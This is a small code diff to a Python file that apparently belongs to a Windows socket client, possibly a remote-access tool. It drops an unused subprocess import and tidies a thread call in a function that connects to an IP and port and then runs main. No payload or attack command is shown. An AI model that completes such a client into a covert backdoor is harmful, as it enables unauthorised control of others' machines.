@@ -3,7 +3,6 @@ import os
 import socket
 import requests
 import threading
-import subprocess
 import shutil
 import winreg
 import sys
@@ -86,7 +85,7 @@ def main():
 def connecting(ip, port):
     try:
         s.connect((ip, port))
-        threading.Thread(target = main, args=()).start()
+        threading.Thread(target=main, args=()).start()
 
 
     except:
